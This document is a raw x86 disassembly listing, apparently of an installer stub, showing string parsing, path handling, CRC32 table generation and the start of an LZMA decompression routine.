  406514:	66 83 fa 37          	cmp    $0x37,%dx
  406518:	77 06                	ja     0x406520
  40651a:	6a 08                	push   $0x8
  40651c:	58                   	pop    %eax
  40651d:	6a 37                	push   $0x37
  40651f:	5b                   	pop    %ebx
  406520:	0f b7 d2             	movzwl %dx,%edx
  406523:	83 e2 df             	and    $0xffffffdf,%edx
  406526:	83 fa 58             	cmp    $0x58,%edx
  406529:	75 05                	jne    0x406530
  40652b:	6a 10                	push   $0x10
  40652d:	41                   	inc    %ecx
  40652e:	58                   	pop    %eax
  40652f:	41                   	inc    %ecx
  406530:	0f b7 11             	movzwl (%ecx),%edx
  406533:	41                   	inc    %ecx
  406534:	41                   	inc    %ecx
  406535:	83 fa 30             	cmp    $0x30,%edx
  406538:	7c 0c                	jl     0x406546
  40653a:	0f b7 f3             	movzwl %bx,%esi
  40653d:	3b d6                	cmp    %esi,%edx
  40653f:	7f 05                	jg     0x406546
  406541:	83 ea 30             	sub    $0x30,%edx
  406544:	eb 1b                	jmp    0x406561
  406546:	66 3d 10 00          	cmp    $0x10,%ax
  40654a:	75 23                	jne    0x40656f
  40654c:	8b f2                	mov    %edx,%esi
  40654e:	83 e6 df             	and    $0xffffffdf,%esi
  406551:	83 fe 41             	cmp    $0x41,%esi
  406554:	7c 19                	jl     0x40656f
  406556:	83 fe 46             	cmp    $0x46,%esi
  406559:	7f 14                	jg     0x40656f
  40655b:	83 e2 07             	and    $0x7,%edx
  40655e:	83 c2 09             	add    $0x9,%edx
  406561:	0f b7 f0             	movzwl %ax,%esi
  406564:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  406568:	03 f2                	add    %edx,%esi
  40656a:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40656d:	eb c1                	jmp    0x406530
  40656f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406572:	5e                   	pop    %esi
  406573:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  406577:	5b                   	pop    %ebx
  406578:	c9                   	leave
  406579:	c2 04 00             	ret    $0x4
  40657c:	68 00 04 00 00       	push   $0x400
  406581:	ff 74 24 0c          	push   0xc(%esp)
  406585:	ff 74 24 0c          	push   0xc(%esp)
  406589:	ff 15 98 80 40 00    	call   *0x408098
  40658f:	c2 08 00             	ret    $0x8
  406592:	ff 25 9c 80 40 00    	jmp    *0x40809c
  406598:	ff 25 54 81 40 00    	jmp    *0x408154
  40659e:	33 c0                	xor    %eax,%eax
  4065a0:	50                   	push   %eax
  4065a1:	50                   	push   %eax
  4065a2:	ff 74 24 14          	push   0x14(%esp)
  4065a6:	ff 74 24 14          	push   0x14(%esp)
  4065aa:	6a ff                	push   $0xffffffff
  4065ac:	ff 74 24 18          	push   0x18(%esp)
  4065b0:	50                   	push   %eax
  4065b1:	50                   	push   %eax
  4065b2:	ff 15 94 80 40 00    	call   *0x408094
  4065b8:	c3                   	ret
  4065b9:	8b 44 24 08          	mov    0x8(%esp),%eax
  4065bd:	83 ec 10             	sub    $0x10,%esp
  4065c0:	85 c0                	test   %eax,%eax
  4065c2:	7d 11                	jge    0x4065d5
  4065c4:	8b 0d fc 89 42 00    	mov    0x4289fc,%ecx
  4065ca:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4065d1:	2b c8                	sub    %eax,%ecx
  4065d3:	8b 01                	mov    (%ecx),%eax
  4065d5:	8b 0d 58 9a 42 00    	mov    0x429a58,%ecx
  4065db:	53                   	push   %ebx
  4065dc:	55                   	push   %ebp
  4065dd:	56                   	push   %esi
  4065de:	57                   	push   %edi
  4065df:	8d 3c 41             	lea    (%ecx,%eax,2),%edi
  4065e2:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4065e6:	b8 c0 79 42 00       	mov    $0x4279c0,%eax
  4065eb:	3b c8                	cmp    %eax,%ecx
  4065ed:	8b f0                	mov    %eax,%esi
  4065ef:	0f 82 0a 02 00 00    	jb     0x4067ff
  4065f5:	8b d1                	mov    %ecx,%edx
  4065f7:	2b d0                	sub    %eax,%edx
  4065f9:	d1 fa                	sar    $1,%edx
  4065fb:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406601:	0f 83 f8 01 00 00    	jae    0x4067ff
  406607:	83 64 24 24 00       	andl   $0x0,0x24(%esp)
  40660c:	8b f1                	mov    %ecx,%esi
  40660e:	e9 ec 01 00 00       	jmp    0x4067ff
  406613:	8b ce                	mov    %esi,%ecx
  406615:	2b c8                	sub    %eax,%ecx
  406617:	83 e1 fe             	and    $0xfffffffe,%ecx
  40661a:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  406620:	0f 8d e5 01 00 00    	jge    0x40680b
  406626:	6a 02                	push   $0x2
  406628:	59                   	pop    %ecx
  406629:	03 f9                	add    %ecx,%edi
  40662b:	66 83 fd 04          	cmp    $0x4,%bp
  40662f:	0f 83 b7 01 00 00    	jae    0x4067ec
  406635:	8a 4f 01             	mov    0x1(%edi),%cl
  406638:	8a 07                	mov    (%edi),%al
  40663a:	8a d1                	mov    %cl,%dl
  40663c:	8a d8                	mov    %al,%bl
  40663e:	83 e2 7f             	and    $0x7f,%edx
  406641:	83 e3 7f             	and    $0x7f,%ebx
  406644:	c1 e2 07             	shl    $0x7,%edx
  406647:	0f b6 c0             	movzbl %al,%eax
  40664a:	0b d3                	or     %ebx,%edx
  40664c:	8b d8                	mov    %eax,%ebx
  40664e:	89 54 24 28          	mov    %edx,0x28(%esp)
  406652:	ba 00 80 00 00       	mov    $0x8000,%edx
  406657:	0b da                	or     %edx,%ebx
  406659:	6a 02                	push   $0x2
  40665b:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40665f:	89 44 24 18          	mov    %eax,0x18(%esp)
  406663:	0f b6 d9             	movzbl %cl,%ebx
  406666:	8b cb                	mov    %ebx,%ecx
  406668:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  40666c:	0b ca                	or     %edx,%ecx
  40666e:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  406672:	59                   	pop    %ecx
  406673:	03 f9                	add    %ecx,%edi
  406675:	66 3b e9             	cmp    %cx,%bp
  406678:	0f 85 12 01 00 00    	jne    0x406790
  40667e:	33 ed                	xor    %ebp,%ebp
  406680:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  406684:	39 2d a4 9a 42 00    	cmp    %ebp,0x429aa4
  40668a:	74 08                	je     0x406694
  40668c:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%esp)
  406693:	00 
  406694:	84 c0                	test   %al,%al
  406696:	79 38                	jns    0x4066d0
  406698:	8b c8                	mov    %eax,%ecx
  40669a:	83 e0 3f             	and    $0x3f,%eax
  40669d:	83 e1 40             	and    $0x40,%ecx
  4066a0:	51                   	push   %ecx
  4066a1:	8b 0d 58 9a 42 00    	mov    0x429a58,%ecx
  4066a7:	56                   	push   %esi
  4066a8:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4066ab:	50                   	push   %eax
  4066ac:	68 20 84 40 00       	push   $0x408420
  4066b1:	68 02 00 00 80       	push   $0x80000002
  4066b6:	e8 8f fd ff ff       	call   0x40644a
  4066bb:	66 39 2e             	cmp    %bp,(%esi)
  4066be:	0f 85 b4 00 00 00    	jne    0x406778
  4066c4:	53                   	push   %ebx
  4066c5:	56                   	push   %esi
  4066c6:	e8 ee fe ff ff       	call   0x4065b9
  4066cb:	e9 a3 00 00 00       	jmp    0x406773
  4066d0:	83 f8 25             	cmp    $0x25,%eax
  4066d3:	75 11                	jne    0x4066e6
  4066d5:	68 00 04 00 00       	push   $0x400
  4066da:	56                   	push   %esi
  4066db:	ff 15 58 81 40 00    	call   *0x408158
  4066e1:	e9 8d 00 00 00       	jmp    0x406773
  4066e6:	83 f8 24             	cmp    $0x24,%eax
  4066e9:	75 10                	jne    0x4066fb
  4066eb:	68 00 04 00 00       	push   $0x400
  4066f0:	56                   	push   %esi
  4066f1:	ff 15 b0 80 40 00    	call   *0x4080b0
  4066f7:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  4066fb:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  4066ff:	74 72                	je     0x406773
  406701:	ff 4c 24 28          	decl   0x28(%esp)
  406705:	8b 44 24 28          	mov    0x28(%esp),%eax
  406709:	8b 5c 84 10          	mov    0x10(%esp,%eax,4),%ebx
  40670d:	a1 24 9a 42 00       	mov    0x429a24,%eax
  406712:	83 e3 bf             	and    $0xffffffbf,%ebx
  406715:	8b eb                	mov    %ebx,%ebp
  406717:	81 e5 00 80 00 00    	and    $0x8000,%ebp
  40671d:	85 c0                	test   %eax,%eax
  40671f:	74 12                	je     0x406733
  406721:	56                   	push   %esi
  406722:	6a 00                	push   $0x0
  406724:	6a 00                	push   $0x0
  406726:	53                   	push   %ebx
  406727:	ff 35 28 9a 42 00    	push   0x429a28
  40672d:	ff d0                	call   *%eax
  40672f:	85 c0                	test   %eax,%eax
  406731:	74 3a                	je     0x40676d
  406733:	6a 07                	push   $0x7
  406735:	e8 36 02 00 00       	call   0x406970
  40673a:	0f b6 cb             	movzbl %bl,%ecx
  40673d:	55                   	push   %ebp
  40673e:	51                   	push   %ecx
  40673f:	ff 35 28 9a 42 00    	push   0x429a28
  406745:	ff d0                	call   *%eax
  406747:	8b d8                	mov    %eax,%ebx
  406749:	85 db                	test   %ebx,%ebx
  40674b:	74 15                	je     0x406762
  40674d:	56                   	push   %esi
  40674e:	53                   	push   %ebx
  40674f:	ff 15 74 81 40 00    	call   *0x408174
  406755:	53                   	push   %ebx
  406756:	8b e8                	mov    %eax,%ebp
  406758:	ff 15 a0 82 40 00    	call   *0x4082a0
  40675e:	85 ed                	test   %ebp,%ebp
  406760:	75 0b                	jne    0x40676d
  406762:	66 83 26 00          	andw   $0x0,(%esi)
  406766:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  40676b:	75 94                	jne    0x406701
  40676d:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  406771:	33 ed                	xor    %ebp,%ebp
  406773:	66 39 2e             	cmp    %bp,(%esi)
  406776:	74 10                	je     0x406788
  406778:	83 fb 1a             	cmp    $0x1a,%ebx
  40677b:	75 0b                	jne    0x406788
  40677d:	68 78 84 40 00       	push   $0x408478
  406782:	56                   	push   %esi
  406783:	e8 10 fe ff ff       	call   0x406598
  406788:	56                   	push   %esi
  406789:	e8 9c 00 00 00       	call   0x40682a
  40678e:	eb 4c                	jmp    0x4067dc
  406790:	66 83 fd 03          	cmp    $0x3,%bp
  406794:	75 32                	jne    0x4067c8
  406796:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  40679a:	83 fb 1d             	cmp    $0x1d,%ebx
  40679d:	75 0e                	jne    0x4067ad
  40679f:	ff 35 28 9a 42 00    	push   0x429a28
  4067a5:	56                   	push   %esi
  4067a6:	e8 18 fd ff ff       	call   0x4064c3
  4067ab:	eb 11                	jmp    0x4067be
  4067ad:	8b c3                	mov    %ebx,%eax
  4067af:	c1 e0 0b             	shl    $0xb,%eax
  4067b2:	05 00 a0 42 00       	add    $0x42a000,%eax
  4067b7:	50                   	push   %eax
  4067b8:	56                   	push   %esi
  4067b9:	e8 be fd ff ff       	call   0x40657c
  4067be:	83 c3 eb             	add    $0xffffffeb,%ebx
  4067c1:	83 fb 07             	cmp    $0x7,%ebx
  4067c4:	73 16                	jae    0x4067dc
  4067c6:	eb c0                	jmp    0x406788
  4067c8:	66 83 fd 01          	cmp    $0x1,%bp
  4067cc:	75 0e                	jne    0x4067dc
  4067ce:	83 c8 ff             	or     $0xffffffff,%eax
  4067d1:	2b 44 24 28          	sub    0x28(%esp),%eax
  4067d5:	50                   	push   %eax
  4067d6:	56                   	push   %esi
  4067d7:	e8 dd fd ff ff       	call   0x4065b9
  4067dc:	56                   	push   %esi
  4067dd:	e8 b0 fd ff ff       	call   0x406592
  4067e2:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4067e5:	b8 c0 79 42 00       	mov    $0x4279c0,%eax
  4067ea:	eb 13                	jmp    0x4067ff
  4067ec:	75 0c                	jne    0x4067fa
  4067ee:	66 8b 17             	mov    (%edi),%dx
  4067f1:	66 89 16             	mov    %dx,(%esi)
  4067f4:	03 f1                	add    %ecx,%esi
  4067f6:	03 f9                	add    %ecx,%edi
  4067f8:	eb 05                	jmp    0x4067ff
  4067fa:	66 89 2e             	mov    %bp,(%esi)
  4067fd:	03 f1                	add    %ecx,%esi
  4067ff:	66 8b 2f             	mov    (%edi),%bp
  406802:	66 85 ed             	test   %bp,%bp
  406805:	0f 85 08 fe ff ff    	jne    0x406613
  40680b:	66 83 26 00          	andw   $0x0,(%esi)
  40680f:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  406814:	5f                   	pop    %edi
  406815:	5e                   	pop    %esi
  406816:	5d                   	pop    %ebp
  406817:	5b                   	pop    %ebx
  406818:	74 0a                	je     0x406824
  40681a:	50                   	push   %eax
  40681b:	ff 74 24 18          	push   0x18(%esp)
  40681f:	e8 58 fd ff ff       	call   0x40657c
  406824:	83 c4 10             	add    $0x10,%esp
  406827:	c2 08 00             	ret    $0x8
  40682a:	55                   	push   %ebp
  40682b:	56                   	push   %esi
  40682c:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406830:	57                   	push   %edi
  406831:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  406835:	75 18                	jne    0x40684f
  406837:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  40683c:	75 11                	jne    0x40684f
  40683e:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406843:	75 0a                	jne    0x40684f
  406845:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  40684a:	75 03                	jne    0x40684f
  40684c:	83 c6 08             	add    $0x8,%esi
  40684f:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406853:	74 0d                	je     0x406862
  406855:	56                   	push   %esi
  406856:	e8 67 f6 ff ff       	call   0x405ec2
  40685b:	85 c0                	test   %eax,%eax
  40685d:	74 03                	je     0x406862
  40685f:	83 c6 04             	add    $0x4,%esi
  406862:	66 8b 06             	mov    (%esi),%ax
  406865:	8b ee                	mov    %esi,%ebp
  406867:	66 85 c0             	test   %ax,%ax
  40686a:	8b fe                	mov    %esi,%edi
  40686c:	74 40                	je     0x4068ae
  40686e:	53                   	push   %ebx
  40686f:	8b 1d 08 82 40 00    	mov    0x408208,%ebx
  406875:	66 3d 1f 00          	cmp    $0x1f,%ax
  406879:	76 25                	jbe    0x4068a0
  40687b:	50                   	push   %eax
  40687c:	68 9c a5 40 00       	push   $0x40a59c
  406881:	e8 f2 f5 ff ff       	call   0x405e78
  406886:	66 83 38 00          	cmpw   $0x0,(%eax)
  40688a:	75 14                	jne    0x4068a0
  40688c:	56                   	push   %esi
  40688d:	ff d3                	call   *%ebx
  40688f:	2b c6                	sub    %esi,%eax
  406891:	d1 f8                	sar    $1,%eax
  406893:	50                   	push   %eax
  406894:	56                   	push   %esi
  406895:	57                   	push   %edi
  406896:	e8 8c f7 ff ff       	call   0x406027
  40689b:	57                   	push   %edi
  40689c:	ff d3                	call   *%ebx
  40689e:	8b f8                	mov    %eax,%edi
  4068a0:	56                   	push   %esi
  4068a1:	ff d3                	call   *%ebx
  4068a3:	8b f0                	mov    %eax,%esi
  4068a5:	66 8b 06             	mov    (%esi),%ax
  4068a8:	66 85 c0             	test   %ax,%ax
  4068ab:	75 c8                	jne    0x406875
  4068ad:	5b                   	pop    %ebx
  4068ae:	66 83 27 00          	andw   $0x0,(%edi)
  4068b2:	57                   	push   %edi
  4068b3:	55                   	push   %ebp
  4068b4:	ff 15 fc 81 40 00    	call   *0x4081fc
  4068ba:	8b f8                	mov    %eax,%edi
  4068bc:	66 8b 07             	mov    (%edi),%ax
  4068bf:	66 3d 20 00          	cmp    $0x20,%ax
  4068c3:	74 06                	je     0x4068cb
  4068c5:	66 3d 5c 00          	cmp    $0x5c,%ax
  4068c9:	75 08                	jne    0x4068d3
  4068cb:	66 83 27 00          	andw   $0x0,(%edi)
  4068cf:	3b ef                	cmp    %edi,%ebp
  4068d1:	72 df                	jb     0x4068b2
  4068d3:	5f                   	pop    %edi
  4068d4:	5e                   	pop    %esi
  4068d5:	5d                   	pop    %ebp
  4068d6:	c2 04 00             	ret    $0x4
  4068d9:	56                   	push   %esi
  4068da:	be 58 5f 42 00       	mov    $0x425f58,%esi
  4068df:	56                   	push   %esi
  4068e0:	ff 74 24 0c          	push   0xc(%esp)
  4068e4:	ff 15 40 81 40 00    	call   *0x408140
  4068ea:	83 f8 ff             	cmp    $0xffffffff,%eax
  4068ed:	74 0b                	je     0x4068fa
  4068ef:	50                   	push   %eax
  4068f0:	ff 15 38 81 40 00    	call   *0x408138
  4068f6:	8b c6                	mov    %esi,%eax
  4068f8:	eb 02                	jmp    0x4068fc
  4068fa:	33 c0                	xor    %eax,%eax
  4068fc:	5e                   	pop    %esi
  4068fd:	c2 04 00             	ret    $0x4
  406900:	55                   	push   %ebp
  406901:	8b ec                	mov    %esp,%ebp
  406903:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  406909:	56                   	push   %esi
  40690a:	be 04 01 00 00       	mov    $0x104,%esi
  40690f:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406915:	56                   	push   %esi
  406916:	50                   	push   %eax
  406917:	ff 15 58 81 40 00    	call   *0x408158
  40691d:	3b c6                	cmp    %esi,%eax
  40691f:	5e                   	pop    %esi
  406920:	76 02                	jbe    0x406924
  406922:	33 c0                	xor    %eax,%eax
  406924:	85 c0                	test   %eax,%eax
  406926:	74 0f                	je     0x406937
  406928:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  40692f:	ff 5c 
  406931:	74 04                	je     0x406937
  406933:	33 c9                	xor    %ecx,%ecx
  406935:	eb 03                	jmp    0x40693a
  406937:	33 c9                	xor    %ecx,%ecx
  406939:	41                   	inc    %ecx
  40693a:	ff 75 08             	push   0x8(%ebp)
  40693d:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  406944:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  40694b:	51                   	push   %ecx
  40694c:	68 b0 a5 40 00       	push   $0x40a5b0
  406951:	50                   	push   %eax
  406952:	ff 15 2c 82 40 00    	call   *0x40822c
  406958:	83 c4 10             	add    $0x10,%esp
  40695b:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406961:	6a 08                	push   $0x8
  406963:	6a 00                	push   $0x0
  406965:	50                   	push   %eax
  406966:	ff 15 18 81 40 00    	call   *0x408118
  40696c:	c9                   	leave
  40696d:	c2 04 00             	ret    $0x4
  406970:	8b 44 24 04          	mov    0x4(%esp),%eax
  406974:	56                   	push   %esi
  406975:	8b f0                	mov    %eax,%esi
  406977:	57                   	push   %edi
  406978:	c1 e6 03             	shl    $0x3,%esi
  40697b:	8b be d8 a3 40 00    	mov    0x40a3d8(%esi),%edi
  406981:	57                   	push   %edi
  406982:	ff 15 60 81 40 00    	call   *0x408160
  406988:	85 c0                	test   %eax,%eax
  40698a:	75 0a                	jne    0x406996
  40698c:	57                   	push   %edi
  40698d:	e8 6e ff ff ff       	call   0x406900
  406992:	85 c0                	test   %eax,%eax
  406994:	74 0f                	je     0x4069a5
  406996:	ff b6 dc a3 40 00    	push   0x40a3dc(%esi)
  40699c:	50                   	push   %eax
  40699d:	ff 15 5c 81 40 00    	call   *0x40815c
  4069a3:	eb 02                	jmp    0x4069a7
  4069a5:	33 c0                	xor    %eax,%eax
  4069a7:	5f                   	pop    %edi
  4069a8:	5e                   	pop    %esi
  4069a9:	c2 04 00             	ret    $0x4
  4069ac:	55                   	push   %ebp
  4069ad:	8b ec                	mov    %esp,%ebp
  4069af:	83 ec 1c             	sub    $0x1c,%esp
  4069b2:	56                   	push   %esi
  4069b3:	8b 75 08             	mov    0x8(%ebp),%esi
  4069b6:	57                   	push   %edi
  4069b7:	8b 3d 84 82 40 00    	mov    0x408284,%edi
  4069bd:	eb 0a                	jmp    0x4069c9
  4069bf:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4069c2:	50                   	push   %eax
  4069c3:	ff 15 7c 82 40 00    	call   *0x40827c
  4069c9:	6a 01                	push   $0x1
  4069cb:	56                   	push   %esi
  4069cc:	56                   	push   %esi
  4069cd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4069d0:	6a 00                	push   $0x0
  4069d2:	50                   	push   %eax
  4069d3:	ff d7                	call   *%edi
  4069d5:	85 c0                	test   %eax,%eax
  4069d7:	75 e6                	jne    0x4069bf
  4069d9:	5f                   	pop    %edi
  4069da:	5e                   	pop    %esi
  4069db:	c9                   	leave
  4069dc:	c2 04 00             	ret    $0x4
  4069df:	55                   	push   %ebp
  4069e0:	8b ec                	mov    %esp,%ebp
  4069e2:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4069e8:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4069ee:	68 00 01 00 00       	push   $0x100
  4069f3:	50                   	push   %eax
  4069f4:	ff 75 0c             	push   0xc(%ebp)
  4069f7:	e8 a2 fb ff ff       	call   0x40659e
  4069fc:	83 c4 0c             	add    $0xc,%esp
  4069ff:	85 c0                	test   %eax,%eax
  406a01:	74 12                	je     0x406a15
  406a03:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406a09:	50                   	push   %eax
  406a0a:	ff 75 08             	push   0x8(%ebp)
  406a0d:	ff 15 5c 81 40 00    	call   *0x40815c
  406a13:	eb 02                	jmp    0x406a17
  406a15:	33 c0                	xor    %eax,%eax
  406a17:	c9                   	leave
  406a18:	c2 08 00             	ret    $0x8
  406a1b:	55                   	push   %ebp
  406a1c:	8b ec                	mov    %esp,%ebp
  406a1e:	51                   	push   %ecx
  406a1f:	56                   	push   %esi
  406a20:	8b 35 68 81 40 00    	mov    0x408168,%esi
  406a26:	57                   	push   %edi
  406a27:	6a 64                	push   $0x64
  406a29:	ff 75 08             	push   0x8(%ebp)
  406a2c:	ff d6                	call   *%esi
  406a2e:	bf 02 01 00 00       	mov    $0x102,%edi
  406a33:	eb 0e                	jmp    0x406a43
  406a35:	6a 0f                	push   $0xf
  406a37:	e8 70 ff ff ff       	call   0x4069ac
  406a3c:	6a 64                	push   $0x64
  406a3e:	ff 75 08             	push   0x8(%ebp)
  406a41:	ff d6                	call   *%esi
  406a43:	3b c7                	cmp    %edi,%eax
  406a45:	74 ee                	je     0x406a35
  406a47:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a4a:	50                   	push   %eax
  406a4b:	ff 75 08             	push   0x8(%ebp)
  406a4e:	ff 15 64 81 40 00    	call   *0x408164
  406a54:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a57:	5f                   	pop    %edi
  406a58:	5e                   	pop    %esi
  406a59:	c9                   	leave
  406a5a:	c2 04 00             	ret    $0x4
  406a5d:	83 3d ac 75 42 00 00 	cmpl   $0x0,0x4275ac
  406a64:	56                   	push   %esi
  406a65:	75 2d                	jne    0x406a94
  406a67:	33 c9                	xor    %ecx,%ecx
  406a69:	6a 08                	push   $0x8
  406a6b:	8b c1                	mov    %ecx,%eax
  406a6d:	5e                   	pop    %esi
  406a6e:	8b d0                	mov    %eax,%edx
  406a70:	80 e2 01             	and    $0x1,%dl
  406a73:	f6 da                	neg    %dl
  406a75:	1b d2                	sbb    %edx,%edx
  406a77:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406a7d:	d1 e8                	shr    $1,%eax
  406a7f:	33 c2                	xor    %edx,%eax
  406a81:	4e                   	dec    %esi
  406a82:	75 ea                	jne    0x406a6e
  406a84:	89 04 8d a8 75 42 00 	mov    %eax,0x4275a8(,%ecx,4)
  406a8b:	41                   	inc    %ecx
  406a8c:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406a92:	7c d5                	jl     0x406a69
  406a94:	8b 54 24 10          	mov    0x10(%esp),%edx
  406a98:	8b 44 24 08          	mov    0x8(%esp),%eax
  406a9c:	85 d2                	test   %edx,%edx
  406a9e:	f7 d0                	not    %eax
  406aa0:	76 23                	jbe    0x406ac5
  406aa2:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406aa6:	57                   	push   %edi
  406aa7:	0f b6 39             	movzbl (%ecx),%edi
  406aaa:	8b f0                	mov    %eax,%esi
  406aac:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406ab2:	33 f7                	xor    %edi,%esi
  406ab4:	c1 e8 08             	shr    $0x8,%eax
  406ab7:	8b 34 b5 a8 75 42 00 	mov    0x4275a8(,%esi,4),%esi
  406abe:	33 c6                	xor    %esi,%eax
  406ac0:	41                   	inc    %ecx
  406ac1:	4a                   	dec    %edx
  406ac2:	75 e3                	jne    0x406aa7
  406ac4:	5f                   	pop    %edi
  406ac5:	f7 d0                	not    %eax
  406ac7:	5e                   	pop    %esi
  406ac8:	c2 0c 00             	ret    $0xc
  406acb:	b8 80 00 00 00       	mov    $0x80,%eax
  406ad0:	48                   	dec    %eax
  406ad1:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406ad5:	75 f9                	jne    0x406ad0
  406ad7:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406adb:	33 c0                	xor    %eax,%eax
  406add:	40                   	inc    %eax
  406ade:	89 41 68             	mov    %eax,0x68(%ecx)
  406ae1:	89 41 64             	mov    %eax,0x64(%ecx)
  406ae4:	89 41 60             	mov    %eax,0x60(%ecx)
  406ae7:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406aea:	c3                   	ret
  406aeb:	55                   	push   %ebp
  406aec:	8b ec                	mov    %esp,%ebp
  406aee:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406af4:	53                   	push   %ebx
  406af5:	56                   	push   %esi
  406af6:	57                   	push   %edi
  406af7:	6a 22                	push   $0x22
  406af9:	8b f1                	mov    %ecx,%esi
  406afb:	59                   	pop    %ecx
  406afc:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406b02:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406b08:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406b0a:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406b0e:	75 08                	jne    0x406b18
  406b10:	33 c0                	xor    %eax,%eax
  406b12:	40                   	inc    %eax
  406b13:	e9 20 0a 00 00       	jmp    0x407538
  406b18:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406b1b:	8b 75 ac             	mov    -0x54(%ebp),%esi
  406b1e:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406b24:	83 f8 1c             	cmp    $0x1c,%eax
  406b27:	0f 87 08 0a 00 00    	ja     0x407535
  406b2d:	ff 24 85 3d 75 40 00 	jmp    *0x40753d(,%eax,4)
  406b34:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406b38:	0f 84 e2 09 00 00    	je     0x407520
  406b3e:	8b 45 90             	mov    -0x70(%ebp),%eax
  406b41:	ff 4d 94             	decl   -0x6c(%ebp)
  406b44:	ff 45 90             	incl   -0x70(%ebp)
  406b47:	8a 00                	mov    (%eax),%al
  406b49:	3c e1                	cmp    $0xe1,%al
  406b4b:	0f 87 e4 09 00 00    	ja     0x407535
  406b51:	0f b6 c0             	movzbl %al,%eax
  406b54:	6a 2d                	push   $0x2d
  406b56:	99                   	cltd
  406b57:	59                   	pop    %ecx
  406b58:	f7 f9                	idiv   %ecx
  406b5a:	6a 09                	push   $0x9
  406b5c:	59                   	pop    %ecx
  406b5d:	8b f0                	mov    %eax,%esi
  406b5f:	0f b6 c2             	movzbl %dl,%eax
  406b62:	99                   	cltd
  406b63:	f7 f9                	idiv   %ecx
  406b65:	8b ce                	mov    %esi,%ecx
  406b67:	0f b6 fa             	movzbl %dl,%edi
  406b6a:	33 d2                	xor    %edx,%edx
  406b6c:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  406b6f:	42                   	inc    %edx
  406b70:	d3 e2                	shl    %cl,%edx
  406b72:	8b c8                	mov    %eax,%ecx
  406b74:	4a                   	dec    %edx
  406b75:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406b78:	33 d2                	xor    %edx,%edx
  406b7a:	42                   	inc    %edx
  406b7b:	d3 e2                	shl    %cl,%edx
  406b7d:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  406b80:	be 00 03 00 00       	mov    $0x300,%esi
  406b85:	d3 e6                	shl    %cl,%esi
  406b87:	4a                   	dec    %edx
  406b88:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406b8b:	81 c6 36 07 00 00    	add    $0x736,%esi
  406b91:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406b94:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  406b97:	74 26                	je     0x406bbf
  406b99:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406b9d:	74 09                	je     0x406ba8
  406b9f:	ff 75 fc             	push   -0x4(%ebp)
  406ba2:	ff 15 0c 81 40 00    	call   *0x40810c
  406ba8:	57                   	push   %edi
  406ba9:	6a 40                	push   $0x40
  406bab:	ff 15 10 81 40 00    	call   *0x408110
  406bb1:	85 c0                	test   %eax,%eax
  406bb3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406bb6:	0f 84 79 09 00 00    	je     0x407535
  406bbc:	89 7d 88             	mov    %edi,-0x78(%ebp)
  406bbf:	85 f6                	test   %esi,%esi
  406bc1:	74 0c                	je     0x406bcf
  406bc3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bc6:	4e                   	dec    %esi
  406bc7:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
